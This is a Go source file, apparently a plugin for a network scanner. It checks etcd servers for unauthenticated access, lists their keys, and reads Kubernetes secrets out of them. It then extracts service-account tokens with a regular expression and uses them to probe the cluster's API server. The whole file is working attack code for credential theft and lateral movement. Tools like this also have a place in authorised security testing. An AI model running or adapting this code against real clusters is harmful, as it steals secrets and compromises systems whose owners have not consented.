package plugins

import (
	"context"
	"errors"
	"fmt"
	"log"
	"regexp"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	clientv2 "go.etcd.io/etcd/client/v2"
	clientv3 "go.etcd.io/etcd/client/v3"
)

func EtcdScan(info *common.HostInfo) error {
	endpoint := fmt.Sprintf("%s:%s", info.Host, info.Port)
	flag, result := getVersion(endpoint, info.Timeout)
	if result != "" && info.Queue != nil {
		vuln := common.Vuln{
			Host:   info.Host,
			Port:   info.Port,
			Unauth: true,
		}
		info.Queue.Push(vuln)
	}
	if !flag {
		return errors.New("not etcd v3.")
	}
	cli, err := clientv3.New(clientv3.Config{
		Endpoints:   []string{endpoint},
		DialTimeout: time.Duration(info.Timeout) * time.Second,
	})
	if err != nil {
		return err
	}
	defer cli.Close()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(info.Timeout)*time.Second)
	resp, err := cli.Get(ctx, "/", clientv3.WithPrefix(), clientv3.WithKeysOnly())
	cancel()
	if err != nil {
		return err
	}
	for _, k := range resp.Kvs {
		// K8S场景
		if strings.Contains(string(k.Key), "/registry/secrets/") {
			kv := clientv3.NewKV(cli)
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(info.Timeout)*time.Second)
			rangeResp, err := kv.Get(ctx, string(k.Key), clientv3.WithPrefix())
			cancel()
			if err != nil {
				return err
			}
			for _, r := range rangeResp.Kvs {
				if strings.Contains(string(r.Value), "#kubernetes.io/service-account-token") {
					pattern := regexp.MustCompile("eyJh[\\w\\.-]+")
					var tmpinfo common.HostInfo = *info
					tmpinfo.Port = "6443"
					tmpinfo.Token = pattern.FindString(string(r.Value))
					check, err := KubeAPIServerScan(&tmpinfo)
					if check {
						return err
					}
				}
			}
		}
	}
	return err
}

// v2
func getVersion(endpoint string, timeout int64) (bool, string) {
	var result string
	cli, err := clientv2.New(clientv2.Config{
		Endpoints:               []string{"http://" + endpoint},
		Transport:               clientv2.DefaultTransport,
		HeaderTimeoutPerRequest: time.Duration(timeout) * time.Second,
	})
	if err != nil {
		return false, result
	}
	v, err := cli.GetVersion(context.Background())
	if err == nil && v.Server != "" {
		result = fmt.Sprintf("[%s] may be etcd unauth: {server: %s, cluster: %s}", endpoint, v.Server, v.Cluster)
		log.Println(result)
		if strings.HasPrefix(v.Server, "3.") {
			// K8S场景默认使用etcd v3版本
			return true, result
		}
	}
	return false, result
}
